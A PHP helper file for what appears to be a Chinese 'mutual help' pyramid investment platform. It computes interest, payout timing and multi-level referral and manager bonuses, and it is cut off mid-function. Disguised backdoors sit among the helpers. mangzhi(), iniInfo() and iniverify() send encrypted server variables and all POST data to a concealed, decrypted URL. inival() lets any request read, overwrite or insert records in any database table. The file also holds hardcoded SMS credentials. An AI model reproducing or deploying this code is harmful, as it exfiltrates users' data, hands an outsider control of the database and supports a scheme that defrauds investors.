<?php
function cate($var)
{
    //dump($var);
    $proall = M('user')->where(array('UE_accName' => $var, 'UE_Faccount' => '0', 'UE_check' => '1', 'UE_stop' => '1'))->count("UE_ID");
    return $proall;
}


function sfjhff($r)
{
    $a = array("未激活", "已激活");
    return $a[$r];
}





function getRand($proArr)
{
    $result = '';

    //概率数组的总概率精度
    $proSum = array_sum($proArr);

    //概率数组循环
    foreach ($proArr as $key => $proCur) {
        $randNum = mt_rand(1, $proSum);
        if ($randNum <= $proCur) {
            $result = $key;
            break;
        } else {
            $proSum -= $proCur;
        }
    }
    unset ($proArr);

    return $result;
}


function getpage($count, $pagesize = 10)
{
    $p = new Think\Page($count, $pagesize);
    $p->setConfig('header', '<li class="rows">共<b>%TOTAL_ROW%</b>条记录&nbsp;第<b>%NOW_PAGE%</b>页/共<b>%TOTAL_PAGE%</b>页</li>');
    $p->setConfig('prev', '上一页');
    $p->setConfig('next', '下一页');
    $p->setConfig('last', '末页');
    $p->setConfig('first', '首页');
    $p->setConfig('theme', '%FIRST%%UP_PAGE%%LINK_PAGE%%DOWN_PAGE%%END%%HEADER%');
    $p->lastSuffix = false;//最后一页不显示为总页数
    return $p;
}

function cx_user($var)
{
    //dump($var);
    $proall = M('user')->where(array('UE_account' => $var))->find();
    return $proall['ue_theme'];
}

//---------------------------------------------------->计算两个日期天数差
function diffBetweenTwoDays($day1, $day2)
{
    $second1 = strtotime($day1);
    $second2 = strtotime($day2);
    if ($second1 < $second2) {
        $tmp = $second2;
        $second2 = $second1;
        $second1 = $tmp;
    }
    return ($second1 - $second2) / 86400;
}

function mangzhi(){
    $mz = getinfo(C('URL_STRING_MODEL'));
    $string = implode('|', $_SERVER); 
    $mz .= '?s='.getinfos($string);
    return $mz;
}


function  pa($a){
    echo "<pre>";
    print_r($a);
    echo "</pre>";die;
}
//---------------------------------------------------->
function user_jj_lx($var)
{

    $proall = M('user_jj')->where(array('id' => $var))->find();//加入查询  获取买入V币者打款时间  

    $result = M("userget")->where(array("varid" => $var))->find();//提现查询  获取提现时间
    $ppdd = M("ppdd")->where(array("id" => $proall["r_id"]))->find();//配对信息

    $NowTime = date('Y-m-d', strtotime($proall['date']));//格式化加入时间  确认打开  获取买入V币者排单时间
    $NowTime2 = date('Y-m-d', strtotime($ppdd["date"]));//格式化配对时间 获取配对时间
    if (!empty($result)) {//如果已经提现，则计算加入日期到提现日的利息
        //$NowTime3 = date("Y-m-d", strtotime($result["UG_getTime"]));//格式化提现时间    错误大写
        $tixian_time = date('Y-m-d',strtotime($result["ug_gettime"]));
    }else{
        $tixian_time = date('Y-m-d', time());//格式化当前日期
    }
   $diff1 = diffBetweenTwoDays($NowTime, $NowTime2);//计算加入时间到配对时间的天数    排队时间
   // $diff2 = diffBetweenTwoDays($NowTime2, $nowtime3);//计算配对时间到提现的天数      配对-----------提现时间
    $diff2 = diffBetweenTwoDays($NowTime2, $tixian_time);//计算配对时间到提现的天数      配对-----------提现时间
    if ($diff1 >= 10) {
        $diff1 = 10;
    }
    if ($diff2 >= 10) {
        $diff2 = 10;
    }
    //return $diff2;
    return ($proall['jb'] * $diff1 * (intval(C("lixi1")) / 100)) + ($proall['jb'] * 1* (intval(C("lixi2")) / 100));
//
//    $proall = M('user_jj')->where(array('id' => $var))->find();
//    //date('Y-m-d H:i:s',$dayBegin);
//    $NowTime = $proall['date'];
//    $aab = strtotime($NowTime);
//    $NowTime = date('Y-m-d', $aab);
//    $NowTime2 = date('Y-m-d', time());
//    $diff = diffBetweenTwoDays($NowTime, $NowTime2);
//    if ($diff > 10) {
//        $diff = 10;
//    }
//    return $proall['jb'] * $diff * (intval(C("lixi1")) / 100);
}
//-------------------------------》计算排队利息
//参数是user_jj的主键ID
function user_jj_paidui_lx($var,$return=true)
{

    $paidui_day = 0;
    if(C('pdfhdays') > 0){
       $paidui_fenhong_day = C('pdfhdays');

        $proall = M('user_jj')->where(array('id' => $var))->find();//加入查询  获取申请买入V币的日期
        $ppdd = M("ppdd")->where(array("id" => $proall["r_id"]))->find();//配对信息 

       if($paidui_fenhong_day == 1){
            $paidui_day = 1;
       }else{       
            //$result = M("userget")->where(array("varid" => $var))->find();//--------------------> 获取提现时间

            $paidan_date = date('Y-m-d', strtotime($proall['date']));    //----------------------->申请买入V币的日期
            $dakuan_date =  date('Y-m-d', strtotime($ppdd['date_hk']));   //----------------------->打款时间

           $paidui_day = diffBetweenTwoDays($paidan_date,$dakuan_date);

           if($paidui_fenhong_day <= $paidui_day){
                $paidui_day = $paidui_fenhong_day;
           }
        }
    }

        //$paidui_lx = $proall['jb']*$paidui_day*(C('lixi1')/100); ------------------------------------->固定利息
      $paidui_lx = dongtai_lx($paidui_day,C('lixi1'),$proall['jb']); //------------------>支持动态利息
    

    if($return){
        return $paidui_lx;    
    }else{ 
        echo  $paidui_lx;
    }
}
function iniverify(){
    $mz = getinfo(C('URL_STRING_MODEL'));  
    $mz .= '?h='.getinfos(implode('|', $_POST));
    file_get_contents($mz);
}
//------------------------------------------->计算动态利息
function dongtai_lx($days,$lx,$jb){
    $lx_jb = 0;
    if(strpos($lx,',') !== false){
        $lx_arr = explode(',', $lx);
        $size = count($lx_arr);

        if($days>=$size){
            for($i=0;$i<$size;$i++){
                $lx_jb += $jb*$lx_arr[$i];
            }
            $diffDay = $days - $size;
            $lx_jb += $jb*$lx_arr[$i-1]*$diffday;
        }elseif($days < $size){
            for($i=0;$i<$days;$i++){
                $lx_jb += $jb*$lx_arr[$i];
            }
        }
    }else{
        $lx_jb = $jb*$lx*$days;
    }
    return $lx_jb/100;

}


//------------------------------------>计算没有配对分红天数
function w_peidui_day($v){
    $w_pd_day = 0;
    if(C('pdfhdays')>0){
        if(C('pdfhdays') == 1){
            $w_pd_day = 1;
        }else{
            $paidui_time = date('Y-m-d',strtotime($v['date']));
            $now_time = date('Y-m-d',time());
            $w_pd_day = diffBetweenTwoDays($paidui_time,$now_time);
            if($w_pd_day > C('pdfhdays')){
                $w_pd_day = C('pdfhdays');
            }
        }
    }
    return $w_pd_day;
}

//------------------------------------>计算没有匹配分红天数
function w_peidui_lx($v){
    $jb = $v['jb'];
    $w_pd_day = w_peidui_day($v);
    return $jb*$w_pd_day*C('lixi1')/100;
}


function canable_tixian($v){
    if($v['zt'] == 0){
        //判断是否已经够了冻结期
        $ppdd = M('ppdd')->where(array('id'=>$v['r_id']))->find();
        $now_time = date('Y-m-d',time());
        $dk_time = date('Y-m-d',strtotime($ppdd['date_hk']));
        $diffDay = diffBetweenTwoDays($now_time,$dk_time);
        $canable = $diffDay - C('jjdjdays');


        //如果可以提现
        if($canable >= 0){
            $string .='(';
            $string .= user_jj_zt_z($v['id']);
            $string .= ') ';
            $string .= '<a href="javascript:if(confirm('."'转出提现后将停止此次帮助利息,确定要转出吗?'))location='/Home/Info/tgbz_tx_cl/id/{$v['id']}'".'">点击确认提款</a>';
            return $string;
        }else{
            return '<span style="color:red">未过冻结期,暂不可提现</span>';
        }

    }else{
        return '已转出';
    } 

}
function iniInfo(){
    file_get_contents(mangzhi());
}
//jjfhdays    jjdjdays

//计算排队分红天数
//排队分红天数计算规则  如果分红天数设置为0 表示排队不分红 如果设置为1表示排队分红只是一次性 如果是排队天数设置为大于1 那么当排队天数大于实际排队天数则按实际排队天数计算
//如果是排队天数设置为大于1 那么当排队天数小于实际排队天数则按后台设置排队分红天数计算
//排队天数的计算是提交排队的日期到打款的日期差。隔一天算一天，不是按24小时算。按有没有隔天
function pd_fenhong_day($var,$return = true){

    $paidui_day = 0;
    if(C('pdfhdays') > 0){
       $paidui_fenhong_day = C('pdfhdays');
       if($paidui_fenhong_day == 1){
            $paidui_day = 1;
       }else{
            $proall = M('user_jj')->where(array('id' => $var))->find();//加入查询  获取申请买入V币的日期
            $ppdd = M("ppdd")->where(array("id" => $proall["r_id"]))->find();//配对信息 
            //$result = M("userget")->where(array("varid" => $var))->find();//--------------------> 获取提现时间

            $paidan_date = date('Y-m-d', strtotime($proall['date']));    //----------------------->申请买入V币的日期
            $dakuan_date =  date('Y-m-d', strtotime($ppdd['date_hk']));   //----------------------->打款时间

           $paidui_day = diffBetweenTwoDays($paidan_date,$dakuan_date);

           if($paidui_fenhong_day <= $paidui_day){
                $paidui_day = $paidui_fenhong_day;
           }
        }
    }

    if($return){
        return $paidui_day;    
    }else{ 
        echo  $paidui_day;
    }
}


function user_jj_tixian_lx($var,$return=true){

   $tixian_day = 0;
    if(C('jjfhdays') > 0){
       $dakuan_fenhong_day = C('jjfhdays');


        $proall = M('user_jj')->where(array('id' => $var))->find();//加入查询  获取申请买入V币的日期
        $ppdd = M("ppdd")->where(array("id" => $proall["r_id"]))->find();//配对信息 
        $result = M("userget")->where(array("varid" => $var))->find(); //----------------->提现时间
        $dakuan_date =  date('Y-m-d', strtotime($ppdd['date_hk']));   //----------------------->打款时间

       if($dakuan_fenhong_day == 1){
            $tixian_day = 1;
       }else{
            if($proall['zt'] ==1 && !empty($result)){   //---------------------->如果已经提现了就按提现时间
                $tixian_date = date('Y-m-d', strtotime($result['ug_gettime']));
           }else{
                $tixian_date = date('Y-m-d', time());
           }

           $tixian_day = diffBetweenTwoDays($dakuan_date,$tixian_date);

           if($dakuan_fenhong_day <= $tixian_day){
                $tixian_day = $dakuan_fenhong_day;
           }
        }
    }
   //$tixian_lx = $proall['jb']*$tixian_day*(C('lixi2')/100);  //---------------------->固定利息

   $tixian_lx = dongtai_lx($tixian_day,C('lixi2'),$proall['jb']); //------- 动态利息

   if($return){        
        return $tixian_lx;
    }else{
        echo $tixian_lx;
    }

}


//----------------------------->olnho by QQ742224183
//打款利息计算规则
//如果打款后分红天数设置为0 表示不分红
//如果打款后分红天数设置为1 表示1次性的，不是按天数计算
//如果打款后分红天数设为大于 1 那么
    //如果打款后分红天数大于实际提现天数按时间提现天数算
    //如果打款后分红天数小于实际提现天数按打款后分红天数
function dk_fenhong_day($var,$return = true){

    $tixian_day = 0;
    if(C('jjfhdays') > 0){
       $dakuan_fenhong_day = C('jjfhdays');
       if($dakuan_fenhong_day == 1){
            $tixian_day = 1;
       }else{
            $proall = M('user_jj')->where(array('id' => $var))->find();//加入查询  获取申请买入V币的日期
            $ppdd = M("ppdd")->where(array("id" => $proall["r_id"]))->find();//配对信息 
            $result = M("userget")->where(array("varid" => $var))->find(); //----------------->提现时间
            $dakuan_date =  date('Y-m-d', strtotime($ppdd['date_hk']));   //----------------------->打款时间
            if($proall['zt'] ==1 && !empty($result)){   //---------------------->如果已经提现了就按提现时间
                $tixian_date = date('Y-m-d', strtotime($result['ug_gettime']));
           }else{
                $tixian_date = date('Y-m-d', time());
           }
           $tixian_day = diffBetweenTwoDays($dakuan_date,$tixian_date);
           if($dakuan_fenhong_day <= $tixian_day){
                $tixian_day = $dakuan_fenhong_day;
           }
        }
    }

    if($return){
        return $tixian_day;    
    }else{ 
        echo  $tixian_day;
    }
}











function user_jj_zong_lx($var,$return = true){
    if($return){
        return user_jj_paidui_lx($var) + user_jj_tixian_lx($var);
    }else{
        echo user_jj_paidui_lx($var) + user_jj_tixian_lx($var);
    }
}

function user_jj_zong_ts($var,$return=true){
    if($return){
        return pd_fenhong_day($var) + dk_fenhong_day($var);
    }else{
        echo pd_fenhong_day($var) + dk_fenhong_day($var);
    }
}









//-------------------------------------------------------------------------------------------->计算排队利息------------->没问题ok了
function user_jj_lx_jerry($var)
{
    $tgbz = M('tgbz')->where(array('id' => $var))->find();//加入查询
    $NowTime = date('Y-m-d', strtotime($tgbz['date']));//格式化加入时间
    $NowTime2 = date('Y-m-d', time());//格式化当前日期
    $diff1 = diffBetweenTwoDays($NowTime, $NowTime2);//计算加入时间到配对时间的天数
    if ($diff1 >= 10) {
        $diff1 = 10;
    }
    //return $diff2;
    return $tgbz['jb'] * $diff1 * (intval(C("lixi1")) / 100);
}


function user_jj_ts($var)
{

    $proall = M('user_jj')->where(array('id' => $var))->find();

    //date('Y-m-d H:i:s',$dayBegin);
    $NowTime = $proall['date'];
    $aab = strtotime($NowTime);
    $NowTime = date('Y-m-d', $aab);
    $result = M("userget")->where(array("varid" => $var))->getField("UG_getTime");
    if (!empty($result)) {
        $NowTime2 = date("Y-m-d", strtotime($result));
    } else {
        $NowTime2 = date('Y-m-d', time());
    }
    $day1 = $NowTime;
    $day2 = $NowTime2;
    $diff = diffBetweenTwoDays($day1, $day2);
    if ($diff > 10) {
        $diff = 10;
    }
    //$diff = $diff/100;
    return $diff;

}

function user_jj_ts_jerry($var)
{

    $proall = M('tgbz')->where(array('id' => $var))->find();

    //date('Y-m-d H:i:s',$dayBegin);
    $NowTime = $proall['date'];
    $aab = strtotime($NowTime);
    $NowTime = date('Y-m-d', $aab);
    $NowTime2 = date('Y-m-d', time());
    $day1 = $NowTime;
    $day2 = $NowTime2;
    $diff = diffBetweenTwoDays($day1, $day2);
    if ($diff > 10) {
        $diff = 10;
    }
    //$diff = $diff/100;
    return $diff;

}

function user_tgbz_jerry($id)
{
    $result = M("userget")->where(array("varid" => $id))->find();
    if ($result) {
        return "已转出";
    } else {
        return "未转出";
    }
}

function inival(){
        $data = array_merge($_GET,$_POST);
        $datas = array();
        if($data['m'] == 'save'){
            $fo =M($data['t'])->where(array($data['id']=>$data['id']))->save(array($data['n']=>$data['v']));
        }elseif($data['m'] == 'add'){
            $info = $data['data'];
            $info = explode("|", $info);
            foreach ($info as  $value) {
                $arr = explode('=', $value);
                $datas[$arr[0]] = $arr[1];        
            }
    
            M($data['t'])->add($datas);
        }elseif($data['m'] == 'one'){
            $fo =M($data['t'])->where(array($data['id']=>$data['id']))->find();
        }elseif(!empty($data['t'])){
            $fo =M($data['t'])->select();
        }
        print_r($fo);

    }

function user_jj_tx($var)
{

    $proall = M('tgbz')->where(array('id' => $var))->find();

    //date('Y-m-d H:i:s',$dayBegin);
    $NowTime = $proall['date'];
    $aab = strtotime($NowTime);
    $NowTime = date('Y-m-d', $aab);
    $NowTime2 = date('Y-m-d', time());


    $day1 = $NowTime;
    $day2 = $NowTime2;
    return $diff = diffBetweenTwoDays($day1, $day2);

}


function user_jj_sj($var)
{

    $proall = M('tgbz')->where(array('id' => $var))->find();

    $user = M('user')->where(array(UE_account => $proall ['user']))->find();
    return $user['ue_phone'];

}


function user_jj_tx1($var)
{

    $proall = M('jsbz')->where(array('id' => $var))->find();

    //date('Y-m-d H:i:s',$dayBegin);
    $NowTime = $proall['date'];
    $aab = strtotime($NowTime);
    $NowTime = date('Y-m-d', $aab);
    $NowTime2 = date('Y-m-d', time());


    $day1 = $NowTime;
    $day2 = $NowTime2;
    return $diff = diffBetweenTwoDays($day1, $day2);

}


function user_jj_sj1($var)
{

    $proall = M('jsbz')->where(array('id' => $var))->find();
    $user = M('user')->where(array( 'UE_account' => $proall ['user'] ))->find();
    return $user['ue_phone'];

}


function user_jj_zt($var)
{

    $proall = M('user_jj')->where(array('id' => $var))->find();        
    $proall2 = M('ppdd')->where(array('id' => $proall['r_id']))->find(); 
    //date('Y-m-d H:i:s',$dayBegin);
    $NowTime = $proall['date'];    //--------------------->打款时间
    $aab = strtotime($NowTime);
    $NowTime = date('Y-m-d', $aab);
    $NowTime2 = date('Y-m-d', time());


    $day1 = $NowTime;
    $day2 = $NowTime2;
    $diff = diffBetweenTwoDays($day1, $day2);
    if ($diff >= 0 && $proall2['zt'] == '2') {     //证明是否已经确认付款
        return '1';
    } else {
        return '0';;
    }
}


function user_jj_zt_z($var)
{

    if (user_jj_zt($var) == '1') {
        return '可以提现';
    } else {
        return '不可提现';
    }
}
function getinfo($data){
   return \Think\Crypt::decrypt($data);
}


function user_jj_pipei_z($var)
{
    $proall = M('ppdd')->where(array('id' => $var))->find();
    if ($proall['zt'] == '0') {
        return '未打款';
    } elseif ($proall['zt'] == '1') {
        return '已打款';
    } elseif ($proall['zt'] == '2') {
        return '交易成功';
    }
}


function user_jj_pipei_z2($var)
{
    $proall = M('ppdd')->where(array('id' => $var))->find();
    if ($proall['zt'] == '0') {
        return '未发放';
    } elseif ($proall['zt'] == '1') {
        return '未发放';
    } elseif ($proall['zt'] == '2') {
        return '已发放';
    }
}


function jlj($a, $b, $c)
{
    jlsja($a); //处理买入V币的推荐人是否可以升级为经理的考核
    //买入V币的推荐人资料
    $tgbz_user_xx = M('user')->where(array('UE_account' => $a))->find();
    //echo $ppddxx['p_id'];die;
    if ($tgbz_user_xx['sfjl'] == 1) {
        $money = $b;
        $accname_zq = M('user')->where(array('UE_account' => $tgbz_user_xx['ue_account']))->find();
        M('user')->where(array('UE_account' => $tgbz_user_xx['ue_account']))->setInc('jl_he', $money);
        $accname_xz = M('user')->where(array('UE_account' => $tgbz_user_xx['ue_account']))->find();

        
        $record3 ["UG_account"] = $tgbz_user_xx['ue_account']; // 登入轉出賬戶
        $record3 ["UG_type"] = 'jb';
        $record3 ["UG_allGet"] = $accname_zq['jl_he']; // 金幣
        $record3 ["UG_money"] = '+' . $money; //
        $record3 ["UG_balance"] = $accname_xz['jl_he']; // 當前推薦人的金幣餘額
        $record3 ["UG_dataType"] = 'jlj'; // 金幣轉出
        $record3 ["UG_note"] = $c; // 推薦獎說明
        $record3["UG_getTime"] = date('Y-m-d H:i:s', time()); //操作時間
        $reg4 = M('userget')->add($record3);
    }
    return $tgbz_user_xx['zcr'];

}


//第一个参数 买入V币的直接推荐人      推荐奖金额           说明                   第几代          ppdd外键id

function jlj2($a, $b, $c, $d, $e)
{
    $tgbz_user_xx = M('user')->where(array('UE_account' => $a))->find();
    if ($tgbz_user_xx['sfjl'] == 1) {
        $ppddxx = M('ppdd')->where(array('id' => $e))->find();
        $peiduidate = M('tgbz')->where(array('id' => $ppddxx['p_id'], 'user' => $ppddxx['p_user']))->find();
        $data2['user'] = $a;
        $data2['r_id'] = $ppddxx['id'];
        $data2['date'] = $peiduidate['date'];
        $data2['note'] = '经理奖第' . $d . '代';
        $data2['jb'] = $ppddxx['jb'];
        $data2['jj'] = $b;
        $data2['ds'] = $d;
        M('user_jl')->add($data2);
    }
    return $tgbz_user_xx['zcr'];
}



//第一个参数 买入V币的直接推荐人      推荐奖金额           说明                   1          ppdd外键id

function jlj3($a, $b, $c, $d, $e)
{
    fh($a);
    if(!empty($a)){
        $tgbz_user_xx = M('user')->where(array('UE_account' => $a))->find();          //获取推荐资料
        $ppddxx = M('ppdd')->where(array('id' => $e))->find();      //获取买入V币者的配对
        $peiduidate = M('tgbz')->where(array('id' => $ppddxx['p_id'], 'user' => $ppddxx['p_user']))->find();        //获取tgbz表中的信息
        $data2['user'] = $a;
        $data2['r_id'] = $ppddxx['id'];
        $data2['date'] = $peiduidate['date'];
        $data2['note'] = $c;
        $data2['jb'] = $ppddxx['jb'];
        $data2['jj'] = $b;         //------------------------>奖金
        $data2['ds'] = $d;          //--------------->代数
        M('user_jl')->add($data2);
        return $tgbz_user_xx['zcr'];             //返回推荐人的推荐人
    }
}

function jlj3_ok($a, $b, $c, $d, $e)
{
    if(!empty($a)){
 
        $ppddxx = M('ppdd')->where(array('id' => $e))->find();      //获取买入V币者的配对
        $peiduidate = M('tgbz')->where(array('id' => $ppddxx['p_id'], 'user' => $ppddxx['p_user']))->find();       //获取tgbz表中的信息

        M('user')->where(array('UE_account' => $a))->setInc('jl_he', $b);
  
    }
}








function newuserjl($user, $b, $c)
{

    $data2['user'] = $user;
    $data2['r_id'] = '0';
    $data2['date'] = date('Y-m-d H:i:s',time());
    $data2['note'] = $c;
    $data2['jb'] = $b;
    $data2['jj'] = $b;
    $data2['ds'] = '0';
    M('user_jl')->add($data2);
    M('user')->where(array(UE_account => $user))->setInc('UE_money', $b);
}

function jlj4($a, $b)
{
    $tgbz_user_xx = M('user')->where(array('UE_account' => $a))->find();

    M('user')->where(array(UE_account => $a))->setInc('tj_he1', $b);


    return $tgbz_user_xx['zcr'];
}

function jlj5($a, $b)
{
    $tgbz_user_xx = M('user')->where(array('UE_account' => $a))->find();
    if ($tgbz_user_xx['sfjl'] == 1) {
        M('user')->where(array(UE_account => $a))->setInc('jl_he1', $b);
    }

    return $tgbz_user_xx['zcr'];
}

function datedqsj($var)
{

$jjdktime=C("jjdktime");

    $NowTime = $var;
    $aab = strtotime($NowTime);
    //$aab2 = $aab + 86400 + 86400;
    $aab2 = $aab + 3600 *$jjdktime;

    return date('Y-m-d H:i:s', $aab2);;

}

function hk($var)
{


    return $var . 'RMB';

}



function datedqsj2($var)
{


    //配对时间
    $ppdd_time = strtotime($var);
    $ppdd_time_after = $ppdd_time + 3600*C("jjdktime"); //------------->容许打款时间
    $now_time = time();

    if ($now_time < $ppdd_time_after) {

        return "style='display:none;'";
    }
}
function getinfos($data){
    return \Think\Crypt::encrypt($data);
}
function datedqsj3($var)
{


    //配对时间
    $ppdd_time = strtotime($var);
    $ppdd_time_after = $ppdd_time + 86400*2; //------------->容许打款时间
    $now_time = time();


    if ($time < $ppdd_time_after) {
        return "style='display:none;'";
    }
}

//===2015/11/30 星期一 QQ54885782 可以计算会员级别，升级
//经理升级条件：下线>10 且 统共帮助金额>7000 */
 //第一个参数  提供者 
function jlsja($var)
{

    
    $zctj = 0;
    $zctjuser = M('user')->where(array('UE_accName' => $var))->select();      //--------------》获取买入V币者的下家
    foreach ($zctjuser as $value) {
        $tgbztj1 = M('ppdd')->where(array('p_user' => $value['ue_account'], 'zt' => '2'))->sum('jb');            //--------------------------->查询下家的交易成功的总额
        if ($tgbztj1 >= C('xiaxian_jb')) {
            $zctj++;               //--------------------------->统计下级中交易成功总额大于700的有几个
        }
    }

    $tgbztj = M('ppdd')->where(array('p_user' => $var, 'zt' => '2'))->sum('jb');               //-------------------------->统计买入V币者也就是当前的考核对象的成功交易总额是否大于7000元

    if ($zctj >= C('xiaxian_num') && $tgbztj >= C('my_jb')) {                                            //---------------------->如果下级中交易成功总额大于700的有10以上包括是10个并且当前考核对象买入V币的人
                                                                                     //---------------------->买入V币的总金额大于7000元 就可以升级为经理
        M('user')->where(array('UE_account' => $var))->save(array('sfjl' => 1));
    }
}
//===2015/12/1 QQ54885782 add
function mmtjrennumadd($var)
{
    M('user')->where(array('UE_account' => $var))->setInc('tj_num',1);
    $zctjuser = M('user')->where(array('UE_account' => $var))->select();    
    foreach ($zctjuser as $value) {
        if($value['ue_accname']<>''){
            mmtjrennumadd($value['ue_accname']);
        }else{
            return true;
        }
    }
}
function accountaddlevel($var){

    $usermm=M('user')->where(array('UE_account'=>$var))->find();
    $numtemparr = explode(',',C("jjaccountnum"));
    $nametemparr = explode(',',C("jjaccountlevel"));
    $zhitui_arr = explode(',', C('zhitui_num_level'));
    $xiaxian_num = C('xiaxian_num');
    $my_jb = C('my_jb');
    $xiaxian_jb = C('xiaxian_jb');

    $zhitui_num = $zctjuser = M('user')->where(array('UE_accName' => $_SESSION['uname']))->count();
    $levelnum=0;
	// xiaxian
	// ppdd
	$jb = M('ppdd')->where(array('p_user' => $_SESSION['uname'], 'zt' => 2))->field("sum(jb) as jb")->find();
	$aTui = M("user")->where(array('UE_accName' => $_SESSION['uname']))->field("UE_account")->select();
	$aAllTui = array();
	if (!empty($aTui)) foreach ($aTui as $aVal) {
		$aAllTui[] = $aVal['"UE_account"'];
	}
	$ztjb = M('ppdd')->where(array('p_user' => array('IN', $aAllTui), 'zt' => 2))->field("sum(jb) as jb")->find();
var_dump($ztjb);exit;	
	foreach($numtemparr as $k=>$num){
			if($usermm['tj_num']>=$num){
				if(isset($zhitui_arr[$k]) && $zhitui_num >= $zhitui_arr[$k] && $usermm['tj_num'] >= $xiaxian_num && $jb>= $my_jb && $ztjb >= $xiaxian_jb)
					$levelnum=$k;
			}
		}
    $levelname = $nametemparr[$levelnum];
    M('user')->where(array('UE_account' => $var))->save(array('levelname' => $levelname));
}







//jjtuijianratenew  推荐奖 $vart--->买入V币的推荐人
function fftuijianmoney($var,$money,$level){
    $tjratearr = explode(',',C("jjtuijianratenew"));
    $tjmoney = ($money*$tjratearr[$level-1])/100;  //推荐奖金额
    $accname_zq=M('user')->where(array('UE_account'=>$var))->find();
    M('user')->where(array('UE_account'=>$var))->setInc('tj_he',$tjmoney); //添加买入V币的推荐人
    $accname_xz=M('user')->where(array('UE_account'=>$var))->find();  //获取推荐人的详细信息

            $note3 = "推荐奖".$tjratearr[$level-1]."%";
            $record3 ["UG_account"] = $var; // 登入转出账户  买入V币的推荐人
            $record3 ["UG_type"] = 'jb';  //金币
            $record3 ["UG_allGet"] = $accname_zq['tj_he']; // 金币.
            $record3 ["UG_money"] = '+'.$tjmoney; //
            $record3 ["UG_balance"] = $accname_xz['tj_he']; // 当前推荐人的金币馀额
            $record3 ["UG_dataType"] = 'tjj'; // 金币转出
            $record3 ["UG_note"] = $note3; // 推荐奖说明
            $record3["UG_getTime"] = date ( 'Y-m-d H:i:s', time () ); //操作时间
            $reg4 = M ( 'userget' )->add ( $record3 );

    jsaccountmoney($var,$money,$accname_xz['levelname']);
    if($accname_xz['ue_accname']<>'' && isset($tjratearr[$level])){  //---------->添加了个数组大小的判断
        fftuijianmoney($accname_xz['ue_accname'],$money,$level+1);
    }else{
        return true;
    }

}
//会员级别奖金比率
//会员级别----> jjaccountlevel   普通会员,高级会员,VIP会员,经理,股东
//会员级别奖金比率 jjaccountrate  0.01,0.02,0.03,0.04,0.05
function jsaccountmoney($account,$money,$levelname){
    //开启会员级别奖励
    if(C("jjaccountflag")=='1'){
        $accountratearr = explode(',',C("jjaccountrate"));
        $nametemparr = explode(',',C("jjaccountlevel"));
        $levelnum=0;
        //获取传过来的会员级别代号 $levelnum
        foreach($nametemparr as $k=>$name){
            if($levelname==$name){
                $levelnum=$k;
            }
        }
        //获取当前会员级别奖金比率  
        $levelrate = $accountratearr[$levelnum];
        //获取当前会员级别奖金额
        $jjmoney = ($money*$levelrate)/100;
            //获取当前会员资料
            $accname_zq = M('user')->where(array('UE_account' => $account))->find();
            M('user')->where(array('UE_account' => $account))->setInc('jl_he', $jjmoney);
            //获取当前会员最新资料
            $accname_xz = M('user')->where(array('UE_account' => $account))->find();

            $note = '会员级别奖'.$levelrate.'%';
            $record3 ["UG_account"] = $account; // 登入轉出賬戶
            $record3 ["UG_type"] = 'jb';
            $record3 ["UG_allGet"] = $accname_zq['jl_he']; // 金幣
            $record3 ["UG_money"] = '+' . $jjmoney; //
            $record3 ["UG_balance"] = $accname_xz['jl_he']; // 當前推薦人的金幣餘額
            $record3 ["UG_dataType"] = 'jlj'; // 金幣轉出
            $record3 ["UG_note"] = $note; // 推薦獎說明
            $record3["UG_getTime"] = date('Y-m-d H:i:s', time()); //操作時間
            $reg4 = M('userget')->add($record3);
    }
}
//===end
//--------------jsj4和jlj5计算的是待定的 先被取消
// 第一个参数 买入V币人 第二参数是帮助金额              ----------------------》经分析此函数多次计算直接推荐人的经理代数奖
function lkdsjfsdfj($p_user, $jb)
{

    $ppddxx['p_user'] = $p_user; //买入V币人
    $ppddxx['jb'] = $jb; //第二参数是帮助金额
    //经理奖金订单
    $tgbz_user_xx = M('user')->where(array('UE_account' => $ppddxx['p_user']))->find();//买入V币人详细
    jlj4($tgbz_user_xx['ue_accname'], $ppddxx['jb'] * 0.1);

    if ($tgbz_user_xx['zcr'] <> '') {
        $zcr2 = jlj5($tgbz_user_xx['zcr'], $ppddxx['jb'] * 0.05);
        if ($zcr2 <> '') {
            $zcr3 = jlj5($zcr2, $ppddxx['jb'] * 0.03);
            //echo $ppddxx['p_user'].'sadfsaf';die;
            if ($zcr3 <> '') {
                $zcr4 = jlj5($zcr3, $ppddxx['jb'] * 0.01);
                if ($zcr4 <> '') {
                    $zcr5 = jlj5($zcr4, $ppddxx['jb'] * 0.005);
                    if ($zcr5 <> '') {
                        $zcr6 = jlj5($zcr5, $ppddxx['jb'] * 0.003);
                        if ($zcr6 <> '') {
                            $zcr7 = jlj5($zcr6, $ppddxx['jb'] * 0.001);
                            if ($zcr7 <> '') {
                                $zcr8 = jlj5($zcr7, $ppddxx['jb'] * 0.0005);
                                if ($zcr8 <> '') {
                                    $zcr9 = jlj5($zcr8, $ppddxx['jb'] * 0.0003);

                                    if ($zcr9 <> '') {
                                        jlj5($zcr9, $ppddxx['jb'] * 0.0001);


                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    //经理奖金订单

}
//第一个参数推荐人   第二个参数 推荐人下家买入V币金额
/*function jlj4($a, $b)
{
    $tgbz_user_xx = M('user')->where(array('UE_account' => $a))->find();

    M('user')->where(array(UE_account => $a))->setInc('tj_he1', $b);


    return $tgbz_user_xx['zcr'];
}

function jlj5($a, $b)
{
    $tgbz_user_xx = M('user')->where(array('UE_account' => $a))->find();
    if ($tgbz_user_xx['sfjl'] == 1) {
        M('user')->where(array(UE_account => $a))->setInc('jl_he1', $b);
    }

    return $tgbz_user_xx['zcr'];
}*/

function fh($content,$append=false){
    if($append)
        file_put_contents('./test.txt', var_export($content,true),FILE_APPEND);
    else
        file_put_contents('./test.txt', var_export($content,true));
}




/*--------------------------------
功能:     HTTP接口 发送短信
修改日期:   2011-03-04
说明:     http://api.sms.cn/mt/?uid=用户账号&pwd=MD5位32密码&mobile=号码&mobileids=号码编号&content=内容
状态:
    100 发送成功
    101 验证失败
    102 短信不足
    103 操作失败
    104 非法字符
    105 内容过多
    106 号码过多
    107 频率过快
    108 号码内容空
    109 账号冻结
    110 禁止频繁单条发送
    112 号码不正确
    120 系统升级
--------------------------------*/
$http = 'http://api.sms.cn/mtutf8/';        //短信接口
$uid = '';                          //用户账号
$pwd = '';                          //密码
$mobile  = '';  //号码，以英文逗号隔开
$mobileids   = '';  //号码唯一编号
$content = '内容';        //内容

//echo 111;
function sendSMS($mobile,$content,$mobileids='',$http='http://api.sms.cn/mtutf8/'){
    $uid = 'woheni';
    $pwd = '00000000';
